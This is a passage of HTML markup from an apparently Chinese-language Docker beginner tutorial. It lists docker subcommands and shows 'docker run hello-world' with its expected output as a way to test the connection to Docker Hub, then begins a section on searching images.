data-line=\"crayon-5a6f33d579a41465921372-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-43\">43</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-1\"><span class=\"crayon-e\">attach </span><span class=\"crayon-e\">Attach </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-2\"><span class=\"crayon-e\">build  </span><span class=\"crayon-e\">Build </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Dockerfile</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-3\"><span class=\"crayon-e\">commit  </span><span class=\"crayon-i\">Create</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">container</span><span class=\"crayon-s\">'s changes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-4\"><span class=\"crayon-s\">cp  Copy files/folders between a container and the local filesystem</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-5\"><span class=\"crayon-s\">create  Create a new container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-6\"><span class=\"crayon-s\">diff  Inspect changes on a container'</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filesystem</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-7\"><span class=\"crayon-e\">events  </span><span class=\"crayon-e\">Get </span><span class=\"crayon-e\">real </span><span class=\"crayon-e\">time </span><span class=\"crayon-e\">events </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">server</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-8\"><span class=\"crayon-e\">exec  </span><span class=\"crayon-i\">Run</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-9\"><span class=\"crayon-e\">export  </span><span class=\"crayon-i\">Export</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">container</span>'<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filesystem </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-10\"><span class=\"crayon-e\">history  </span><span class=\"crayon-e\">Show </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">history </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-11\"><span class=\"crayon-e\">images  </span><span class=\"crayon-e\">List </span><span class=\"crayon-e\">images</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-12\"><span class=\"crayon-e\">import  </span><span class=\"crayon-e\">Import </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">contents </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tarball </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filesystem </span><span class=\"crayon-e\">image</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-13\"><span class=\"crayon-e\">info  </span><span class=\"crayon-e\">Display </span><span class=\"crayon-v\">system</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">wide </span><span class=\"crayon-e\">information</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-14\"><span class=\"crayon-e\">inspect  </span><span class=\"crayon-st\">Return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">low</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">level </span><span class=\"crayon-e\">information </span><span class=\"crayon-i\">on</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">image</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-15\"><span class=\"crayon-e\">kill  </span><span class=\"crayon-i\">Kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-16\"><span class=\"crayon-e\">load  </span><span class=\"crayon-e\">Load </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">archive </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STDIN</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-17\"><span class=\"crayon-e\">login  </span><span class=\"crayon-e\">Log </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-18\"><span class=\"crayon-e\">logout  </span><span class=\"crayon-e\">Log </span><span class=\"crayon-e\">out </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-19\"><span class=\"crayon-e\">logs  </span><span class=\"crayon-e\">Fetch </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">logs </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-20\"><span class=\"crayon-e\">network  </span><span class=\"crayon-e\">Manage </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">networks</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-21\"><span class=\"crayon-e\">pause  </span><span class=\"crayon-e\">Pause </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">processes </span><span class=\"crayon-i\">within</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-22\"><span class=\"crayon-e\">port  </span><span class=\"crayon-e\">List </span><span class=\"crayon-e\">port </span><span class=\"crayon-e\">mappings </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">specific </span><span class=\"crayon-e\">mapping </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">CONTAINER</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-23\"><span class=\"crayon-e\">ps  </span><span class=\"crayon-e\">List </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-24\"><span class=\"crayon-e\">pull  </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">repository </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-25\"><span class=\"crayon-e\">push  </span><span class=\"crayon-e\">Push </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">repository </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-26\"><span class=\"crayon-e\">rename  </span><span class=\"crayon-i\">Rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-27\"><span class=\"crayon-e\">restart  </span><span class=\"crayon-i\">Restart</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-28\"><span class=\"crayon-e\">rm  </span><span class=\"crayon-e\">Remove </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-29\"><span class=\"crayon-e\">rmi  </span><span class=\"crayon-e\">Remove </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">images</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-30\"><span class=\"crayon-e\">run  </span><span class=\"crayon-i\">Run</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-31\"><span class=\"crayon-e\">save  </span><span class=\"crayon-e\">Save </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">images </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-32\"><span class=\"crayon-e\">search  </span><span class=\"crayon-e\">Search </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">Hub </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">images</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-33\"><span class=\"crayon-e\">start  </span><span class=\"crayon-e\">Start </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">stopped </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-34\"><span class=\"crayon-e\">stats  </span><span class=\"crayon-i\">Display</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">live </span><span class=\"crayon-e\">stream </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">container</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">resource </span><span class=\"crayon-e\">usage </span><span class=\"crayon-e\">statistics</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-35\"><span class=\"crayon-e\">stop  </span><span class=\"crayon-i\">Stop</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-36\"><span class=\"crayon-e\">tag  </span><span class=\"crayon-e\">Tag </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">into</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">repository</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-37\"><span class=\"crayon-e\">top  </span><span class=\"crayon-e\">Display </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">processes </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-38\"><span class=\"crayon-e\">unpause  </span><span class=\"crayon-e\">Unpause </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">processes </span><span class=\"crayon-i\">within</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-39\"><span class=\"crayon-e\">update  </span><span class=\"crayon-e\">Update </span><span class=\"crayon-e\">configuration </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-40\"><span class=\"crayon-e\">version  </span><span class=\"crayon-e\">Show </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">version </span><span class=\"crayon-e\">information</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-41\"><span class=\"crayon-e\">volume  </span><span class=\"crayon-e\">Manage </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">volumes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a41465921372-42\"><span class=\"crayon-e\">wait  </span><span class=\"crayon-e\">Block </span><span class=\"crayon-i\">until</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container </span><span class=\"crayon-v\">stops</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print </span><span class=\"crayon-e\">its </span><span class=\"crayon-e\">exit </span><span class=\"crayon-i\">code</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a41465921372-43\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0090 seconds] -->\r\n<p>要进一步查看某个命令支持的选项，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a46569698765\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker docker-subcommand info\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a46569698765-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a46569698765-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a46569698765-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">subcommand </span><span class=\"crayon-i\">info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a46569698765-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>就会列出 docker 子命令所支持的选项了。</p>\n<h3 id=\"toc_2\">测试与 Docker Hub 的连接</h3>\n<p>默认，所有镜像都是从 Docker Hub 中拉取下来的。我们可以从 Docker Hub 上传或下载操作系统镜像。为了检查我们是否能够正常地通过 Docker Hub 上传/下载镜像，运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a49898031817\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker run hello-world\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a49898031817-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a49898031817-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a49898031817-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">run </span><span class=\"crayon-v\">hello</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">world</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a49898031817-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>结果应该是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a4c969129679\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHello from Docker.\r\nThis message shows that your installation appears to be working correctly.\r\n…\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a4c969129679-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a4c969129679-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a4c969129679-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a4c969129679-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a4c969129679-1\"><span class=\"crayon-e\">Hello </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">Docker</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a4c969129679-2\"><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">message </span><span class=\"crayon-e\">shows </span><span class=\"crayon-e\">that </span><span class=\"crayon-e\">your </span><span class=\"crayon-e\">installation </span><span class=\"crayon-e\">appears </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-e\">working </span><span class=\"crayon-v\">correctly</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f33d579a4c969129679-3\">…</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a4c969129679-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>输出结果表示你可以访问 Docker Hub 而且也能从 Docker Hub 下载 docker 镜像。</p>\n<h3 id=\"toc_3\">搜索镜像</h3>\n<p>搜索容器的镜像，运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a4f456599466\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" 